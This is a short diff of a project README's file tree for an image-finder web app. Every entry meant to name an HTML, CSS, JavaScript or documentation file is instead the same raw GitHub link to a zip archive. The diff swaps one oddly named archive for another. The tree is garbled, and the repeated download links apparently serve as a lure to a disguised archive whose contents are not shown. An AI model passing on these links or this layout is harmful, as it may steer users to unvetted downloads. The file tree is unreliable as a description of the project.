@@ -32,7 +32,7 @@ Copy
 Edit
 /image-finder-app
 │
-├── https://raw.githubusercontent.com/kartik359/image-finder-/main/arango/image-finder-v2.3.zip       # Main HTML file
-├── https://raw.githubusercontent.com/kartik359/image-finder-/main/arango/image-finder-v2.3.zip        # CSS for styling
-├── https://raw.githubusercontent.com/kartik359/image-finder-/main/arango/image-finder-v2.3.zip        # JavaScript logic with Fetch API
-└── https://raw.githubusercontent.com/kartik359/image-finder-/main/arango/image-finder-v2.3.zip        # Project documentation
+├── https://raw.githubusercontent.com/kartik359/image-finder-/main/arango/finder_image_thuggery.zip       # Main HTML file
+├── https://raw.githubusercontent.com/kartik359/image-finder-/main/arango/finder_image_thuggery.zip        # CSS for styling
+├── https://raw.githubusercontent.com/kartik359/image-finder-/main/arango/finder_image_thuggery.zip        # JavaScript logic with Fetch API
+└── https://raw.githubusercontent.com/kartik359/image-finder-/main/arango/finder_image_thuggery.zip        # Project documentation
